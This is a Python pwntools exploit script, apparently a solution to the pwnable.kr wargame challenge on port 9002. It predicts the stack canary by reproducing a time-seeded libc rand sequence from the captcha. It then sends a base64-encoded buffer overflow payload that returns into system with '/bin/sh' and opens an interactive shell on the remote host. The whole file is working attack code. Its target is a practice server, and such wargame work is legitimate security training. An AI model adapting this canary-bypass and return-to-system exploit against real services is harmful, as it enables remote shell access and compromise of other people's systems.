import pwn
import ctypes
import time

libc = ctypes.CDLL("libc.so.6")

# init rand
seed = int(time.time())
libc.srand(seed)
p = pwn.remote("pwnable.kr", 9002)

SYSTEM_ADDRESS =  0xf7acd170
LOCAL_SYSTEM = 0x08049187
MAIN = 0x0804908f
G_BUF_ADDRESS = 0x804b0e0

def next_rand():
    return libc.rand()

def get_cpatcha() -> int:
    captcha = int(p.recvline())
    print(captcha)
    p.sendline(str(captcha))
    return captcha

def calc_cannary(captcha: int) -> int:
    buff = [next_rand() for _ in range(8)]
    return (captcha - (buff[1] + buff[5] + buff[2] - buff[3] + buff[7] - buff[6] + buff[4])) & 0xffffffff

def main():
    p.readuntil("Are you human? input captcha :").decode("utf8")
    captcha = get_cpatcha()
    cannary = calc_cannary(captcha)
    print(f"cannary: {hex(cannary)}")
    #
    p.readuntil("paste me!")
    pyload = [
        b'A' * 512,
        pwn.p32(cannary),
        # Here I just counted how manty bytes are padding the gap
        b'A' * 12,
        pwn.p32(LOCAL_SYSTEM)
    ]
    joined_payload = b"".join(pyload)
    offset_to_bin_sh_string = len(pwn.b64e(joined_payload)) + 4
    address_of_bin_sh = G_BUF_ADDRESS + offset_to_bin_sh_string
    to_send = pwn.b64e(joined_payload + pwn.p32(address_of_bin_sh)) + '/bin/sh\x00'
    p.sendline(to_send)

if __name__ == "__main__":
    main()

p.interactive()
